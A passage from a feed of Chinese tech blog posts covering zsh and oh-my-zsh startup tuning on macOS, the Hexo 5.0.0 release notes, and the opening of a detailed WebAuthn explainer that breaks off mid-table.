数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table 